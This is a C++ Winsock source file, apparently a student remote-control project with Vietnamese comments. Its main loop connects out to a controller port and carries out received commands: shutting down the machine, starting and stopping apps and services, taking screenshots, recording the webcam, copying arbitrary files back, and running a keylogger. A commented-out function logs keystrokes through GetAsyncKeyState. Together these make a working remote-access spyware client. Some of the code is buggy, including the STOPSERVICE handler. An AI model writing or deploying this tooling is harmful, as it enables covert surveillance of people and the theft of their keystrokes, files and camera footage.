// g++ Server.cpp service.cpp Utility.cpp -o main -lws2_32 -lole32 -lshell32 -luuid

#include "stdafx.h"
#include <winsock2.h>
#include <ws2tcpip.h>
#include "iostream"
#include <fstream>
#include <chrono>
#include <thread>
#include <atomic>
#include "Utility.h"
#include "service.cpp"
#include <sstream>
#include <locale>
#include <codecvt>
#include "WebcamRecorder.h"

#pragma comment(lib, "Ws2_32.lib")

using namespace std;

#define bufferSize 1024
#define BUFFER_SIZE 1024

void sendFile(SOCKET serverSocket, const char* filename) {
    ifstream file(filename, ios::binary);
    if (!file.is_open()) {
        cout << "Failed to open file: " << filename << endl;
        return;
    }

    // Lấy kích thước tệp
    file.seekg(0, ios::end);
    int file_size = file.tellg();
    file.seekg(0, ios::beg);

    // Gửi kích thước tệp
    send(serverSocket, (char*)&file_size, sizeof(file_size), 0);

    // Gửi nội dung tệp
    char buffer[bufferSize];
    while (!file.eof()) {
        file.read(buffer, bufferSize);
        int bytes_read = file.gcount();
        send(serverSocket, buffer, bytes_read, 0);
    }

    file.close();
}

// static std::atomic<bool> running{true};

// void displayKeyPress(const char* action, int key) {
//     std::cout << action << ": " << (char)key 
//               << " (ASCII: " << key << ")" << std::endl;
// }

// void keyboardMonitor() {
//     std::cout << "Keyboard monitoring started. Press ESC to exit.\n";
//     int ok = 0;
//     ofstream fout;
//     fout.open("log.txt", std::ios::app);
//     if (!fout.is_open())
//         cout << "Cannot open file! \n";
//     while(running) {
//         for(int key = 8; key <= 255; key++) {
//             if(GetAsyncKeyState(key) == -32767) {
//                 // if(key == VK_ESCAPE) {
//                 //     running = false;
//                 //     break;
//                 // }
//                 // if (ok == 0) {
//                 //     ok = 1;
//                 //     ofstream fout;
//                 //     fout.open("log.txt", std::ios::app);
//                 // }
//                 // ofstream fout;
//                 // fout.open("log.txt", std::ios::app);
//                 // //displayKeyPress("Key pressed", key);
//                 fout << "Key pressed" << ": " << (char)key << " (ASCII: " << key << ")" << std::endl;
//                 // while(fout.is_open())
//                 //     fout.close();
//             }
//         }
//         std::this_thread::sleep_for(std::chrono::milliseconds(10));
//     }
//     fout.close();
//     if (!fout.is_open())
//         cout << "Closed file! \n";
// }



// // Example of how to use timer to stop monitoring after specific duration
// void stopAfterDelay(SOCKET serverSocket) {
//     char buffer[bufferSize];
//     int byteCount;
//     while(true) {
//         byteCount = recv(serverSocket, buffer, bufferSize, 0);
//             if (byteCount > 0) {
//                 cout << buffer << "\n";
//                 if (strcmp(buffer, "STOP") == 0) {
//                     running = false;
//                     break;
//                 }
//             }
//     }
// }

void sendFile(SOCKET clientSocket, const std::string& filePath) {
    std::ifstream file(filePath, std::ios::binary | std::ios::ate);
    if (!file.is_open()) {
        std::cerr << "Failed to open file." << std::endl;
        return;
    }

    // Get file size
    std::streamsize fileSize = file.tellg();
    file.seekg(0, std::ios::beg);

    // Send file info header: "SendFile: filename filesize"
    std::string filename = filePath.substr(filePath.find_last_of("/\\") + 1);
    std::string fileHeader = "SendFile: " + filename + " " + std::to_string(fileSize);
    send(clientSocket, fileHeader.c_str(), fileHeader.size(), 0);

    // Wait for confirmation from the receiver
    char ackBuffer[10];
    recv(clientSocket, ackBuffer, sizeof(ackBuffer), 0);

    // Send file contents in chunks
    char buffer[BUFFER_SIZE];
    std::streamsize totalSent = 0;
    while (file) {
        file.read(buffer, BUFFER_SIZE);
        std::streamsize bytesToSend = file.gcount();

        int bytesSent = 0;
        while (bytesSent < bytesToSend) {
            int sent = send(clientSocket, buffer + bytesSent, bytesToSend - bytesSent, 0);
            if (sent == SOCKET_ERROR) {
                std::cerr << "Error sending file." << std::endl;
                return;
            }
            bytesSent += sent;
        }
        totalSent += bytesSent;
    }

    // Send end-of-file signal
    std::string endSignal = "FileEnd";
    send(clientSocket, endSignal.c_str(), endSignal.size(), 0);

    file.close();
    std::cout << "File sent successfully. Total bytes sent: " << totalSent << std::endl;
}

// std::wstring stringToWstring(const std::string& str) {
//     std::wstring_convert<std::codecvt_utf8<wchar_t>> converter;
//     return converter.from_bytes(str);
// }

std::wstring stringToWstring(const std::string& str) {
    std::wstring wstr(str.begin(), str.end());
    return wstr;
}

int main() {

    cout << "======= W11 Sockets =======\n";
    cout << "========= SERVER ==========\n";
    cout << "=== Step 1 - Set up DLL ===\n\n";

    SOCKET serverSocket, acceptSocket;
    int port = 55555;
    WSADATA wsaData;
    int wsaerr;
    WORD wVersionRequested = MAKEWORD(2, 2);
    wsaerr = WSAStartup(wVersionRequested, &wsaData);
    if (wsaerr != 0) {
        cout << "The Winsock dll not found!" << endl;
        return 0;
    }
    else {
        cout << "The Winsock dll found!" << endl;
        cout << "The status: " << wsaData.szSystemStatus << endl;
    }

    cout << "\n=== Step 2 - Set up Server Socket ===\n\n";

    serverSocket = INVALID_SOCKET;
    serverSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (serverSocket == INVALID_SOCKET) {
        cout << "Error at socket(): " << WSAGetLastError() << endl;
        WSACleanup();
        return 0;
    }
    else cout << "socket() is OK!" << endl;

    cout << "\n=== Step 3 - Bind Socket ===\n\n";

    sockaddr_in service;
    service.sin_family = AF_INET;
    InetPton(AF_INET, "127.0.0.1", &service.sin_addr.s_addr);
    service.sin_port = htons(port);
    if (connect(serverSocket, (SOCKADDR*)&service, sizeof(service)) == SOCKET_ERROR) {
        cout << "Client: connect() - Failed to connect." << endl;
        WSACleanup();
        return 0;
    }
    else {
        cout << "Client: connect() is OK." << endl;
        cout << "Client: Can start sending and receiving data..." << endl;
    }

    // cout << "\n=== Step 4 - Initiate Listen ===\n\n";

    // if (listen(serverSocket, 1) == SOCKET_ERROR) {
    //     cout << "listen(): Error listening on socket " << WSAGetLastError() << endl;
    //     WSACleanup();
    //     return 0;
    // }
    // else {
    //     cout << "listen() is OK, I'm waiting for connections..." << endl;
    // }

    while (true) {
        // cout << "\n=== Step 5 - Accept Connection from Client ===\n\n";

        // acceptSocket = accept(serverSocket, NULL, NULL);
        // if (acceptSocket == INVALID_SOCKET) {
        //     cout << "accept failed: " << WSAGetLastError() << endl;
        //     WSACleanup();
        //     return -1;
        // }
        // cout << "Accepted connection" << endl;

        cout << "\n=== Step 6 - Receive Message from Client ===\n\n";

        char buffer[bufferSize];
        int byteCount;
        Computer computer;
        ServiceManager service;
        WebcamRecorder webcam("outputWebcam.avi");
        while (true) {
            // Nhận tin nhắn từ client
            byteCount = recv(serverSocket, buffer, bufferSize, 0);

            if (byteCount > 0) {
                // Đảm bảo chuỗi kết thúc đúng
                buffer[byteCount] = '\0';
                string tmp(buffer);
                vector<string> v;
                stringstream ss(tmp);
                string w;
                while (ss >> w) {
                    v.push_back(w);
                }
                cout << "Message from client: " << buffer << endl;
                if (strcmp(buffer, "SHUTDOWN") == 0) computer.shutdown();
                else if (strcmp(buffer, "RESET") == 0) computer.reset();
                else if (strcmp(buffer, "LISTAPP") == 0) {
                    computer.listApp();
                    computer.copyFile(serverSocket, "listApp.txt");
                }
                else if (v[0] == "STARTAPP") {
                    computer.startApp(v[1]);

                }
                else if (v[0] == "STOPAPP") {
                    computer.stopApp(v[1]);
                }
                else if (strcmp(buffer, "LISTSERVICE") == 0) {
                    std::vector<ServiceManager::ServiceInfo> servicesList = service.listServices();
                    service.saveServicesToFile(servicesList, L"listServices.txt");
                    computer.copyFile(serverSocket, "listServices.txt");
                }
                else if(v[0] == "STARTSERVICE") {
                    std::wstring ws = stringToWstring(v[1]);
                    bool ok = service.startService(ws);
                }
                else if(strcmp(buffer, "STOPSERVICE") == 0) {
                    std::wstring ws = stringToWstring(v[1]);
                    bool ok = service.stopService(ws);
                }
                else if (strcmp(buffer, "SCREENSHOT") == 0)
                {
                    webcam.screenShot("screenshot.png");
                    computer.copyFile(serverSocket, "screenshot.png");
                } 
                else if (v[0] == "COPYFILE") {
                    computer.copyFile(serverSocket, v[1]);
                }
                else if (strcmp(buffer, "STARTWEBCAME") == 0) webcam.startRecording();
                else if (strcmp(buffer, "STOPWEBCAME") == 0)
                {
                    webcam.stopRecording();
                    computer.copyFile(serverSocket, "outputWebcam.avi");
                } 
                else if (strcmp(buffer, "KEYLOGGER") == 0) {
                    computer.keyLogger(serverSocket);
                    computer.copyFile(serverSocket, "log.txt");
                }
            }
            else if (byteCount == 0) {
                // Client đã ngắt kết nối
                cout << "Client disconnected.\n";
                break;
            }
            else {
                // Lỗi khi nhận tin nhắn
                cout << "recv failed: " << WSAGetLastError() << endl;
                break;
            }
        }

        closesocket(acceptSocket); // Đóng kết nối với client
    }

    closesocket(serverSocket);
    WSACleanup();
    return 0;
}



//int main() {
//
//    cout << "======= W11 Sockets =======\n";
//    cout << "========= SERVER ==========\n";
//    cout << "=== Step 1 - Set up DLL ===\n\n";
//
//    SOCKET serverSocket, acceptSocket;
//    int port = 55555;
//    WSADATA wsaData;
//    int wsaerr;
//    WORD wVersionRequested = MAKEWORD(2, 2);
//    wsaerr = WSAStartup(wVersionRequested, &wsaData);
//    if (wsaerr != 0) {
//        cout << "The Winsock dll not found!" << endl;
//        return 0;
//    }
//    else {
//        cout << "The Winsock dll found!" << endl;
//        cout << "The status: " << wsaData.szSystemStatus << endl;
//    }
//
//    cout << "\n=== Step 2 - Set up Server Socket ===\n\n";
//
//    serverSocket = INVALID_SOCKET;
//    serverSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
//    if (serverSocket == INVALID_SOCKET) {
//        cout << "Error at socket(): " << WSAGetLastError() << endl;
//        WSACleanup();
//        return 0;
//    }
//    else cout << "socket() is OK!" << endl;
//
//    cout << "\n=== Step 3 - Bind Socket ===\n\n";
//
//    sockaddr_in service;
//    service.sin_family = AF_INET;
//    InetPton(AF_INET, L"127.0.0.1", &service.sin_addr.s_addr);
//    service.sin_port = htons(port);
//    if (bind(serverSocket, (SOCKADDR*)&service, sizeof(service)) == SOCKET_ERROR) {
//        cout << "bind() failed: " << WSAGetLastError() << endl;
//        closesocket(serverSocket);
//        WSACleanup();
//        return 0;
//    }
//    else cout << "bind() is OK!" << endl;
//
//    cout << "\n=== Step 4 - Initiate Listen ===\n\n";
//
//    if (listen(serverSocket, 1) == SOCKET_ERROR) cout << "listen(): Error listening on socket " << WSAGetLastError() << endl;
//    else cout << "listen() is OK, I'm waiting for connections..." << endl;
//
//    cout << "\n=== Step 5 - Accept Connection from Client ===\n\n";
//
//    acceptSocket = accept(serverSocket, NULL, NULL);
//    if (acceptSocket == INVALID_SOCKET) {
//        cout << "accept failed: " << WSAGetLastError() << endl;
//        WSACleanup();
//        return -1;
//    }
//    cout << "Accepted connection" << endl;
//
//    cout << "\n=== Step 6 - Chat to the Client ===\n\n";
//
//    char buffer[bufferSize];
//
//    int byteCount = recv(acceptSocket, buffer, bufferSize, 0);
//
//    if (byteCount > 0) {
//        cout << "Message received: " << buffer << endl;
//    }
//    else WSACleanup();
//
//    char confirmation[200] = "Message received";
//
//    byteCount = send(acceptSocket, confirmation, 200, 0);
//
//    if (byteCount > 0) {
//        cout << "Automated message sent to the Client." << endl;
//    }
//    else WSACleanup();
//
//    cout << "\n=== Step 7 - Send image file to client ===\n\n";
//    sendFile(acceptSocket, "image.jpg");
//
//    cout << "\n=== Step 8 - Send video file to client ===\n\n";
//    sendFile(acceptSocket, "video.mp4");
//
//    cout << "\n=== Step 9 - Close Socket ===\n\n";
//
//    closesocket(acceptSocket);
//    closesocket(serverSocket);
//    WSACleanup();
//
//    system("pause");
//    return 0;
//}
